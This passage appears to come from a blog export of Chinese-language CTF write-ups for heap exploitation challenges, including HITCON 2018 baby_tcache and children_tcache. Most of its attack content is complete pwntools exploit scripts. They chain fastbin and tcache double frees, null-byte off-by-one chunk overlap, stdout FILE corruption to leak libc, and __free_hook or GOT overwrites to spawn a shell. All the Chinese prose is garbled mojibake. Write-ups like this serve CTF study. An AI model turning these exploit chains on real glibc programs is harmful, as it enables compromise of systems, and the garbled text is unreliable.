‡è½¬ç§»åˆ°GOTè¡¨ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯é€šè¿‡æ”¹GOTè¡¨çš„å€¼ï¼Œä¸€ç§æ˜¯æ”¹stdoutæŒ‡é’ˆã€‚è¦ç‚¹åŠ«æŒstdoutæŒ‡é’ˆ0x602082çš„å€¼å¯ä»¥å……å½“sizeæ”¹å†™stdoutæŒ‡é’ˆï¼Œä½¿vtableçš„åœ°å€åœ¨æˆ‘ä»¬çš„é¢„å…ˆåˆ†é…å¥½çš„chunkå¤„ï¼Œå¹¶é¢„å…ˆåœ¨chunkä¸­ä¼ªé€ å¥½vtableï¼Œå°†__xsputnå¯¹åº”åç§»å¤„å†™å…¥åŽé—¨å‡½æ•°çš„åœ°å€ã€‚è¿™æ ·ï¼Œå½“è°ƒç”¨printfæ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨__xsputnï¼Œè€Œæ‰§è¡ŒåŽé—¨å‡½æ•°IO_FILEç»“æž„ä½“ä¸­_lockçš„å€¼å¿…é¡»æ˜¯å¯å†™çš„åœ°å€modeçš„å€¼éœ€è¦ä¸º0åŠ«æŒGOTè¡¨0x60204dçš„å€¼å¯ä»¥å……å½“sizeï¼Œå› ä¸ºsizeåªæ£€æŸ¥ä½Ž4ä¸ªå­—èŠ‚ã€‚ç„¶åŽç”¨systemçš„åœ°å€å¾€åŽè¦†å†™æŽ‰strtolå‡½æ•°çš„gotè¡¨å°±è¡Œäº†EXP1åŠ«æŒstdoutæŒ‡é’ˆ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./easiest')elf = ELF('./easiest')def add(index, size, content): p.recvuntil('2 delete \n') p.sendline('1') p.recvuntil('(0-11):') p.sendline(str(index)) p.recvuntil('Length:') p.sendline(str(size)) p.recvuntil('C:') p.sendline(content)def remove(index): p.recvuntil('2 delete \n') p.sendline('2') p.recvuntil('(0-11):') p.sendline(str(index))shell = 0x400946fake_chunk = 0x60207aptr = 0x6020c0add(8, 0x40, p64(shell)*8)add(1, 0x30, p64(0xdeadbeef))add(2, 0x30, p64(0xdeadbeef))add(3, 0x30, p64(0xdeadbeef))remove(1)remove(2)remove(1)add(4, 0x30, p64(fake_chunk))add(9, 0x30, p64(0))payload += "\x00"*0x16 #paddingpayload += p64(ptr - 0xd8 + 8 * 0x8)add(6, 0x30, p64(fake_chunk))add(10, 0x30, payload)p.sendline("aaa")p.interactive()EXP2åŠ«æŒGOTè¡¨12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./easiest')elf = ELF('./easiest')def add(index, size, content): p.recvuntil('2 delete \n') p.sendline('1') p.recvuntil('(0-11):') p.sendline(str(index)) p.recvuntil('Length:') p.sendline(str(size)) p.recvuntil('C:') p.sendline(content)def remove(index): p.recvuntil('2 delete \n') p.sendline('2') p.recvuntil('(0-11):') p.sendline(str(index))fake_chunk = 0x602045add(1, 0x60, p64(0xdeadbeef))add(2, 0x60, p64(0xdeadbeef))add(3, 0x60, p64(0xdeadbeef))remove(1)remove(2)remove(1)add(4, 0x60, p64(fake_chunk))add(9, 0x60, p64(0))payload = "\x00" * 0xb #paddingpayload += p64(elf.symbols['system'])add(6, 0x60, p64(fake_chunk))add(10, 0x68, payload)p.sendline('/bin/sh')p.interactive()ç›¸å…³é“¾æŽ¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼šeasiest]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>å †åˆ©ç”¨</tag>
        <tag>fastbin_attack</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2018 baby_tcache writeup]]></title>
    <url>%2Fpost%2F8e1cd5dc.html</url>
    <content type="text"><![CDATA[è¿™é“é¢˜å’Œå‰ä¸€é“children_tcacheæ˜¯åŒä¸€ä¸ªç³»åˆ—ï¼Œç„¶è€Œè¿™é¢˜éš¾å¤šäº†_(:Ð·ã‚âˆ )_ã€‚åœ¨ç½‘ä¸Šæœäº†ä¸€å¤§åœˆï¼Œè²Œä¼¼åªæœ‰è‹±æ–‡çš„wpï¼Œåªæœ‰ç¡¬ç€å¤´çš®è‚äº†ã€‚ã€‚ã€‚è¿™é¢˜å’Œchildrené‚£é¢˜å”¯ä¸€çš„ä¸åŒå°±æ˜¯è¿™é¢˜æ²¡æœ‰çŽ°æˆçš„è¾“å‡ºåŠŸèƒ½ï¼Œæ³„éœ²å˜å¾—ååˆ†å›°éš¾ï¼Œè¿˜å¥½å‰æ®µæ—¶é—´ä¹Ÿå­¦è¿‡äº†house of orangeï¼Œä¸ç„¶wpéƒ½çœ‹ä¸æ‡‚ã€‚ã€‚é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼šHITCON CTF 2018çŸ¥è¯†ç‚¹ï¼štcache &amp;&amp; overlapping &amp;&amp; off_by_one &amp;&amp; IO_FILEé¢˜ç›®ç•Œé¢ï¼š12345678$$$$$$$$$$$$$$$$$$$$$$$$$$$ðŸŠ Baby Tcache ðŸŠ$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 1. New heap $$ 2. Delete heap $ $ 3. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$Your choice:ä¿æŠ¤å…¨å¼€ï¼š123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabledæ¼æ´žæƒ…å†µå’Œchildren_tcacheçš„æ¼æ´žç‚¹æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œéƒ½æ˜¯null byte off_by_oneï¼Œè¿™é‡Œå°±ä¸å†åˆ†æžäº†ã€‚åˆ©ç”¨è¿‡ç¨‹overlappingå’Œchildren_tcacheå‡ ä¹Žç›¸åŒçš„æ“ä½œï¼Œé€šè¿‡last_remainderæ¥ç»•è¿‡æ£€æŸ¥ï¼Œç„¶åŽoverlappingã€‚123456789101112131415161718192021222324add_7_times(0x80)del_7_times(0, 7)add_7_times(0x120)del_7_times(0, 7)add_7_times(0x200)add(0x208, 'A') #7add(0x200, 'B') #8add(0x200, 'C') #9del_7_times(0, 7)dele(8) dele(7) #remain 9add(0x108, 'A'*0x108) #remain 0 9 || åˆ›å»ºäº†ä¸€ä¸ªlast_remainderadd_7_times(0x80)add(0x80, 'b1') #remain 0 (1-7) 8 9del_7_times(1, 8)add(0x210, 'b2') #add 1 || remain 0 1 8 9 || å°†è¢«overlapçš„chunkdele(8)dele(9) #overlapæ³„éœ²libcè¿™é‡Œä½¿ç”¨IO_FILEæ¥è¿›è¡Œæ³„éœ²ï¼Œå…ˆæ¥çœ‹çœ‹å‰æçŸ¥è¯†ã€‚åœ¨putså‡½æ•°å†…éƒ¨å®žçŽ°ä¸­ï¼Œå…ˆè°ƒç”¨_IO_new_file_overflow123456789101112131415161718int_IO_new_file_overflow (_IO_FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; : : &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, // our target f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæ­£å¸¸çš„è¾“å‡ºæµç¨‹éœ€è¦è°ƒç”¨_IO_do_writeï¼Œæ‰€ä»¥f-&gt;_flags &amp; _IO_NO_WRITESåº”è¯¥ä¸º0ï¼Œf-&gt;_flags &amp; _IO_CURRENTLY_PUTTINGä¸èƒ½ä¸º0ã€‚ç„¶åŽ_IO_do_writeä¼šä»¥ç›¸åŒçš„å‚æ•°è°ƒç”¨new_do_write1234567891011121314151617181920212223static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do); // æˆ‘ä»¬çš„ç›®æ ‡ : :æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æœ€åŽçš„_IO_SYSWRITE(fp, data, to_do)ã€‚ä»Ž_IO_do_writeçš„å®žå‚å¯çŸ¥ï¼Œfpå°±æ˜¯FILEæŒ‡é’ˆï¼Œdataå°±æ˜¯f-&gt;_IO_write_baseï¼Œto_doåˆ™æ˜¯f-&gt;_IO_write_ptr - f-&gt;_IO_write_base(æ•°æ®é•¿åº¦)ã€‚å› ä¸ºelse ifä¸­çš„æ¡ä»¶æž„é€ èµ·æ¥ååˆ†å›°éš¾ï¼Œæ‰€ä»¥è¿™é‡Œè®©ç¨‹åºæµç¨‹é€šè¿‡ifä¸­çš„æ¡ä»¶ï¼Œå³fp-&gt;_flags &amp; _IO_IS_APPENDINGç»¼ä¸Šï¼Œéœ€è¦æ»¡è¶³çš„æ¡ä»¶æœ‰12345678#define _IO_NO_WRITES 0x0008#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING 0x1000_flags = 0xfbad0000 // Magic numberï¼Œæˆ‘ä¹Ÿå¾ˆç»æœ›å•Šï¼Œæ²¡æ‰¾åˆ°è¿™ä¸ªæ•°æ®çš„è§£é‡Š_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800å³flagsåº”è¯¥ä¸º0xfbad1800æ‰€ä»¥ï¼Œå¦‚æžœå¯ä»¥æŽ§åˆ¶stdoutçš„FILEç»“æž„ä½“ï¼Œå°†stdout-&gt;_flagsè®¾ç½®ä¸ºæˆ‘ä»¬è®¡ç®—å‡ºçš„å€¼å¹¶å°†stdout-&gt;_IO_write_baseçš„æœ€ä½Žä½å­—èŠ‚æ”¹å°ä¸€ç‚¹ï¼Œè¿™æ ·å°±èƒ½è¾“å‡ºå†…å­˜ä¸­çš„ä¸€æ®µæ•°æ®ï¼Œè€Œè¿™æ®µæ•°æ®ä¸­é€šå¸¸å°±ä¼šå­˜åœ¨libcä¸­çš„æŸä¸ªåœ°å€ã€‚å› ä¸ºåªè¦èƒ½å¤Ÿä¿®æ”¹tcacheä¸­chunkçš„fdæŒ‡é’ˆï¼Œå°±èƒ½åœ¨ä»»æ„åœ°å€åˆ†é…chunkã€‚åœ¨å‰é¢çš„overlappingä¸­ï¼Œæˆ‘ä»¬å·²ç»æ»¡è¶³äº†è¿™ä¸ªæ¡ä»¶ï¼Œåªéœ€è¦æ”¹å†™chunk_b2çš„fdæŒ‡é’ˆåˆ°_IO_2_1_stdout_(stdoutçš„FILEç»“æž„ä½“)ï¼Œç„¶åŽå°±å¯ä»¥åœ¨æ­¤å¤„åˆ†é…ä¸€ä¸ªchunkå¹¶æ”¹å†™å…¶ä¸­çš„å€¼äº†ã€‚å› ä¸º_IO_2_1_stdout_çš„åœ°å€å’Œåœ¨unsortedbinä¸­chunkçš„fdæŒ‡é’ˆçš„å€¼åªæœ‰æœ€åŽ3ä¸ª16è¿›åˆ¶ä½ä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆåœ¨chunk_b2å¤„é€šè¿‡overlappingç”³è¯·å¹¶é‡Šæ”¾ä¸€ä¸ªsmallchunkæ¥èŽ·å–fdæŒ‡é’ˆç„¶åŽå†é‡æ–°åœ¨è¿™åˆ†é…ä¸€ä¸ªchunkï¼Œé€šè¿‡partial overwriteä¿®æ”¹æœ€ä½Žä¸¤ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæœ‰åŠä¸ªå­—èŠ‚æ— æ³•ç¡®å®šï¼Œæ‰€ä»¥å…ˆéšæ„ç¡®å®šä¸€ä¸ªå€¼ï¼Œé€šè¿‡å¤šæ¬¡è¿è¡Œä½¿å†…å­˜ä¸­çœŸå®žå€¼ä¸Žæˆ‘ä»¬ç¡®å®šçš„å€¼å‘ç”Ÿç¢°æ’žã€‚è¿™é‡Œæˆ‘å°†stdout-&gt;_IO_write_baseæœ€ä½Žä½å­—èŠ‚è®¾ç½®ä¸º\x08ï¼Œå› ä¸ºåˆšå¥½ä»Žè¯¥åœ°å€å¼€å§‹çš„8ä¸ªå­—èŠ‚ä¸ºlibcä¸­çš„ä¸€ä¸ªåœ°å€ã€‚1234567891011121314151617181920212223dele(1) #b2è¿›å…¥tcache || remain 0add_7_times(0x80)add(0x80, 'b1') #add 8del_7_times(1, 8) #remain 0 8#æ­¤æ—¶topchunkä¸Žb2é‡å add_7_times(0x120)add(0x120, 'xxxx') #add 9 || åœ¨b2å¤„åˆ›å»ºä¸€ä¸ªsmallchunkdel_7_times(1, 8) #remain 0 8 9add(0x1000, 'xxxx') #add 1 || é˜²æ­¢topchunkåˆå¹¶dele(9) #remain 0 1 8 || å°†smallchunkåˆé‡Šæ”¾æŽ‰ï¼ŒèŽ·å¾—ä¸€ä¸ªæŒ‡å‘libcå†…éƒ¨çš„fdæŒ‡é’ˆadd(0x50, '\x60\xa7') #add 2 || å†åœ¨b2å¤„åˆ†é…ä¸€ä¸ªchunkï¼Œå¹¶partial overwriteæ”¹å†™fdæŒ‡é’ˆï¼Œè¿™ä¸ªå› ä¸º_IO_2_1_stdout_çš„æœ€ä½Ž3ä¸ª16è¿›åˆ¶ä½ä¸º0x760ï¼Œæ‰€ä»¥å…ˆéšæ„ç¡®å®šè¯¥å€¼ä¸º0xa760ã€‚add(0x210, 'xxxx') #add 3 || ä»Žtcacheä¸­åˆå°†b2åˆ†é…å‡ºæ¥ï¼Œæ­¤æ—¶_IO_2_1_stdout_çš„åœ°å€å°†ä½äºŽtcacheä¸­payload = p64(0xfbad1800)+p64(0)*3+"\x08"add(0x210, payload) #add 4 || remain 0 1 2 3 4 8 || åœ¨_IO_2_1_stdout_å¤„åˆ†é…chunkï¼Œç„¶åŽä¿®æ”¹å…¶ä¸­çš„å˜é‡å€¼#æ³„æ¼libclibc_base = u64(p.recvline()[:8]) - 0x3ED8B0print "libc_base : %#x" % libc_basefree_hook = libc_base + libc.symbols['__free_hook']one_gadget = libc_base + 0x4f322getshellåœ¨æ³„éœ²å‡ºlibcçš„åœ°å€åŽï¼ŒæŽ¥ä¸‹æ¥çš„äº‹æƒ…å°±ç®€å•å¤šäº†ã€‚å› ä¸ºåœ¨ä¸Šé¢ä»£ç ä¸­ï¼Œç´¢å¼•ä¸º2å’Œ3çš„chunkå®žé™…éƒ½ä¸ºchunk_b2ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡tcacheä¸­çš„double freeæ¥å†æ¬¡ä¿®æ”¹fdå€¼ï¼Œå®žçŽ°åœ¨__free_hookå¤„åˆ†é…chunkï¼Œå¹¶å†™å…¥one_gadgetã€‚1234567#3å’Œ2éƒ½æ˜¯chunk_b2ï¼Œdouble freedele(3)dele(2)add(0x50, p64(free_hook)) #ä¿®æ”¹fdä¸ºfree_hookadd(0x50, 'xxxx') add(0x50, p64(one_gadget)) #å°†free_hookä¿®æ”¹ä¸ºonegadgetdele(0)æˆ‘çš„EXPæœ¬åœ°çŽ¯å¢ƒ: Ubuntu 18.04.1 LTS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# coding=utf-8from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p=process('./baby_tcache')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(size, content): p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def dele(index): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def add_7_times(size): for _ in range(7): add(size, 'xxxx')def del_7_times(begin, end): for i in range(begin, end): dele(i)def main(): add_7_times(0x80) del_7_times(0, 7) add_7_times(0x120) del_7_times(0, 7) add_7_times(0x200) add(0x208, 'A') #7 add(0x200, 'B') #8 add(0x200, 'C') #9 del_7_times(0, 7) dele(8) dele(7) #remain 9 add(0x108, 'A'*0x108) #remain 0 9 || åˆ›å»ºäº†ä¸€ä¸ªlast_remainder add_7_times(0x80) add(0x80, 'b1') #remain 0 (1-7) 8 9 del_7_times(1, 8) add(0x210, 'b2') #add 1 || remain 0 1 8 9 || å°†è¢«overlapçš„chunk dele(8) dele(9) #overlap dele(1) #b2è¿›å…¥tcache || remain 0 add_7_times(0x80) add(0x80, 'b1') #add 8 del_7_times(1, 8) #remain 0 8 #æ­¤æ—¶topchunkä¸Žb2é‡å  add_7_times(0x120) add(0x120, 'xxxx') #add 9 || åœ¨b2å¤„åˆ›å»ºä¸€ä¸ªsmallchunk del_7_times(1, 8) #remain 0 8 9 add(0x1000, 'xxxx') #add 1 || é˜²æ­¢topchunkåˆå¹¶ dele(9) #remain 0 1 8 || å°†smallchunkåˆé‡Šæ”¾æŽ‰ï¼ŒèŽ·å¾—ä¸€ä¸ªæŒ‡å‘libcçš„fdæŒ‡é’ˆ add(0x50, '\x60\xa7') #add 2 || å†åœ¨b2å¤„åˆ†é…ä¸€ä¸ªchunkï¼Œå¹¶partial overwriteæ”¹å†™fdæŒ‡é’ˆ add(0x210, 'xxxx') #add 3 || ä»Žtcacheä¸­åˆå°†b2åˆ†é…å‡ºæ¥ï¼Œ_IO_2_1_stdout_çš„åœ°å€ä½äºŽtcacheä¸­ payload = p64(0xfbad1800)+p64(0)*3+"\x08" add(0x210, payload) #add 4 || remain 0 1 2 3 4 8 || åœ¨_IO_2_1_stdout_å¤„åˆ†é…chunkï¼Œç„¶åŽä¿®æ”¹å…¶ä¸­çš„å˜é‡å€¼ #æ³„æ¼libc libc_base = u64(p.recvline()[:8]) - 0x3ED8B0 print "libc_base : %#x" % libc_base free_hook = libc_base + libc.symbols['__free_hook'] one_gadget = libc_base + 0x4f322 #3å’Œ2éƒ½æ˜¯b2,double free dele(3) dele(2) add(0x50, p64(free_hook)) #ä¿®æ”¹fdä¸ºfree_hook add(0x50, 'xxxx') add(0x50, p64(one_gadget)) #å°†free_hookä¿®æ”¹ä¸ºonegadget dele(0)if __name__ == '__main__': while(True): try: main() # gdb.attach(p) p.interactive() p.close() break except: p.close() p = process('./baby_tcache')ç›¸å…³é“¾æŽ¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼šbaby_tcachewriteupå‚è€ƒï¼šhttps://vigneshsrao.github.io/babytcache/https://znqt.github.io/hitcon2018-babytcache/]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>å †åˆ©ç”¨</tag>
        <tag>overlapping</tag>
        <tag>off_by_one</tag>
        <tag>tcache</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2018 children_tcache writeup && overlapping]]></title>
    <url>%2Fpost%2Fcdad9cf7.html</url>
    <content type="text"><![CDATA[ç¬¬ä¸€æ¬¡å‚åŠ HITCON CTFï¼Œä¹‹å‰åœ¨å­¦å †åˆ©ç”¨çš„æ—¶å€™å€’æ˜¯åšè¿‡å‡ é“å¾€å¹´çš„é¢˜ï¼Œè‡ªæˆ‘æ„Ÿè§‰è¿˜æŒºä¸é”™çš„ï¼Œç»“æžœå°±çˆ†é›¶äº†23333ã€‚å‰å‡ å¤©å°±åœ¨ç½‘ä¸Šçœ‹åˆ°äº†è¿™é¢˜çš„writeupï¼Œä¸€ç›´æ‹–åˆ°ä»Šå¤©æ‰æ‹¿æ¥å­¦ä¹ äº†ä¸€æ³¢ï¼Œçœ‹å®Œæ„Ÿè§‰è‡ªå·±æ˜¯çœŸçš„èœã€‚ã€‚ã€‚é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼šHITCON CTF 2018çŸ¥è¯†ç‚¹ï¼štcache &amp;&amp; overlapping &amp;&amp; off_by_oneé¢˜ç›®ç•Œé¢ï¼š123456789$$$$$$$$$$$$$$$$$$$$$$$$$$$ðŸŠ Children Tcache ðŸŠ$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 1. New heap $$ 2. Show heap $$ 3. Delete heap $ $ 4. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$Your choice:ä¿æŠ¤å…¨å¼€ï¼š123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabledæ¼æ´žæƒ…å†µnew_heapå‡½æ•°ä¸­:1234567891011121314 printf("Size:"); size = get_num(); if ( size &gt; 0x2000 ) exit(-2); dest = (char *)malloc(size); if ( !dest ) exit(-1); printf("Data:"); get_str((__int64)&amp;s, size); strcpy(dest, &amp;s); data_list[i] = dest; size_list[i] = size; return __readfsqword(0x28u) ^ v5;&#125;å› ä¸ºstrcpyå‡½æ•°åœ¨æ‹·è´å­—ç¬¦ä¸²æ—¶ï¼Œæœ€åŽçš„â€™\0â€™ä¹Ÿä¼šä¸€èµ·æ‹·è´ï¼Œæ‰€ä»¥å½“è¾“å…¥çš„å­—ç¬¦ä¸²å·²ç»å æ»¡äº†æ‰€åˆ†é…çš„å†…å­˜ï¼Œé‚£æœ€åŽçš„â€™\0â€™ä¼šå¾€åŽæº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œå¯¼è‡´äº†null byte off_by_oneã€‚çœ‹åˆ°null byte off_by_oneï¼Œæˆ‘é¦–å…ˆå°±æƒ³åˆ°æž„é€ chunk overlappingï¼Œç„¶è€Œå¤ªèœã€‚ä¸å¤Ÿç†Ÿæ‚‰tcacheä»¥åŠoverlapï¼Œæ‰€ä»¥åˆ°æœ€åŽä¹Ÿæ²¡åšå‡ºæ¥ç¬”è®°è¿™é¢˜ç›®å…¶å®žä¸éš¾ï¼Œå‰é¢ä¸€éƒ¨åˆ†éƒ½æ˜¯æ ‡å‡†çš„overlapingçš„æµç¨‹ï¼Œåªæ˜¯å› ä¸ºå¤šäº†tcacheï¼Œæ‰€ä»¥è¦ä¸åœçš„å¡«å……å’Œæ¸…ç©ºtcacheï¼Œæ¥ä¿è¯æˆ‘ä»¬çš„chunkä¸å—å®ƒçš„å½±å“ã€‚çœŸæ­£åˆ©ç”¨tcacheçš„åœ°æ–¹åªæœ‰æœ€åŽçš„double free(tcache dup)ã€‚ä¸ºäº†çœæ—¶é—´å°±ä¸å•ç‹¬åˆ†æžäº†ï¼Œç›´æŽ¥å†™åœ¨expé‡Œï¼Œèµ¶ä½œä¸šè¦ç´§ã€‚ã€‚ã€‚ã€‚ã€‚è¡¥å…… overlapping(2018-11-03)ä»Šå¤©åœ¨å‘çŽ°è¿™é¢˜è¿˜æœ‰ä¸€ä¸ªè¦ç‚¹æˆ‘æ²¡æ³¨æ„åˆ°ï¼ï¼ï¼ï¼overlappingæ–°å§¿åŠ¿ï¼ï¼ï¼(å¯¹æˆ‘æ¥è¯´è¶³å¤Ÿæ–°2333)ï¼Œæ‰€ä»¥å›žæ¥è¡¥å……ä¸€ä¸‹overlappingå¸¸è§„å…ˆå›žé¡¾ä¸€ä¸‹å¸¸è§„overlappingå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æžœè¦é€šè¿‡null byte off_by_oneæž„é€ overlappingï¼Œé¦–å…ˆéœ€è¦ä¼ªé€ chunk_Cçš„prevsize(å¦‚ä¸Šå›¾ç¬¬äºŒæ­¥)ï¼Œå¦åˆ™åœ¨åˆ†é…b1çš„æ—¶å€™ä¼šcorrupted size vs. prev_sizeã€‚æ–°å§¿åŠ¿æŸ¥çœ‹mallocæºç å¯ä»¥å‘çŽ°ï¼Œcorruptedçš„åŽŸå› åœ¨äºŽä»Žunsortedbinä¸­å–å‡ºchunkæ—¶ä¼šè°ƒç”¨unlinkï¼Œæ­£æ˜¯unlinkä¸­çš„æ£€æŸ¥å¯¼è‡´äº†é”™è¯¯ã€‚12345678910111213else &#123; // èŽ·å–å¯¹åº”victimçš„å¤§å° size = chunksize(victim); /* We know the first chunk in this bin is big enough to use. */ assert((unsigned long) (size) &gt;= (unsigned long) (nb)); // è®¡ç®—åˆ†å‰²åŽå‰©ä½™çš„å¤§å° remainder_size = size - nb; /* unlink */ unlink(av, victim, bck, fwd); ...&#125;è€Œè¯¥é¢˜ç›®åœ¨freeæ—¶ï¼Œä¼šå°†æ•´ä¸ªchunkå…¨éƒ¨å¡«å……ä¸º0xdaï¼Œæ‰€ä»¥æ²¡æœ‰åŠžæ³•ä¼ªé€ prevsizeã€‚æ‰€ä»¥è¯¥é¢˜åˆ©ç”¨è¿‡ç¨‹ä¸­ä½¿ç”¨äº†é‡‡ç”¨äº†ä¸€ç§ä¸éœ€è¦ä¼ªé€ prevsizeçš„æŠ€å·§ã€‚åœ¨æ‰§è¡Œmallocæ—¶ï¼Œè‹¥fastbinå’Œsmallbinä¸­æ²¡æœ‰åˆé€‚çš„chunkï¼Œå¹¶ä¸”è¯·æ±‚ä¸ºsmall chunkçš„è¯ï¼Œå°†ä¼šé¦–å…ˆè€ƒè™‘ä½¿ç”¨last_remainderã€‚å¦‚æžœlast_remainderæ˜¯unsorted binä¸­çš„å”¯ä¸€ä¸€å—ï¼Œå¹¶ä¸”last_remainderçš„å¤§å°åˆ†å‰²å¤Ÿè¿˜å¯ä»¥ä½œä¸ºä¸€ä¸ª chunkï¼Œé‚£ä¹ˆå°±ä¼šä»Žlast_remainderä¸­åˆ†å‰²ä¸‹åˆé€‚å¤§å°çš„å—ã€‚è€Œä»Žlast_remainderåˆ†å‰²chunkçš„è¯å°±ä¸ä¼šä½¿ç”¨åˆ°unlinkï¼Œä»Žè€ŒæˆåŠŸåˆ†é…1234567891011121314151617181920212223242526272829303132/* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk.*/if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))&#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;&#125;æ‰€ä»¥åªè¦èƒ½æŠŠchunk_Bä½œä¸ºlast_remainderä¸€åˆ‡å°±ç®€å•äº†ã€‚è¯¦è§wpexp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# -*- coding:utf-8 -*-from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']#context.log_level = 'debug'elf = ELF('./children_tcache')libc = ELF('./libc.so.6')p = process('./children_tcache', env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)def add(size, content): p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def show(index): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(index): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Index:') p.sendline(str(index))def add_7_times(size): for _ in range(7): add(size, 'xxxx')def del_7_times(fr, to): for i in range(fr, to): dele(i)#çŽ°åœ¨å †çš„å‰é¢æŠŠè¿™äº›ç”¨äºŽå¡«å……tcacheçš„chunkåˆ†é…å¥½ï¼Œä»¥å…ç ´ååŽé¢å †çš„å¸ƒå±€add_7_times(0x80) #0-6del_7_times(0, 7)add_7_times(0x100) #0-6ï¼Œå¡«å……tcache 0x110add(0x108, '7777') #7 chunk_Aadd(0x100, '8888') #8 chunk_Badd(0x100, '9999') #9 chunk_Cdel_7_times(0, 7)dele(8) #é‡Šæ”¾chunk_Bï¼Œtcacheå·²æ»¡ï¼Œæ”¾å…¥unsortedbindele(7) #é‡Šæ”¾chunk_Aï¼ŒAå’ŒBä¼šåˆå¹¶(é‡è¦)add_7_times(0x100) #0-6add(0x108, '7'*0x108) #7 ä»Žåˆå¹¶çš„chunkä¸­åˆå–å›žchunk_Aï¼ŒåŒæ—¶åˆ›å»ºäº†last_remainder(é‡è¦)#åŒæ—¶é€šè¿‡æº¢å‡º(null byte off_by_one)ä¿®æ”¹äº†chunk_Bçš„size(0x110--&gt;0x100)ï¼Œdel_7_times(0, 7)add_7_times(0x80)add(0x80, '8888') #8 chunk_b1 ä»Žchunk_B(last_remainder)ä¸­åˆ†å‰²ä¸‹æ¥ï¼Œå› 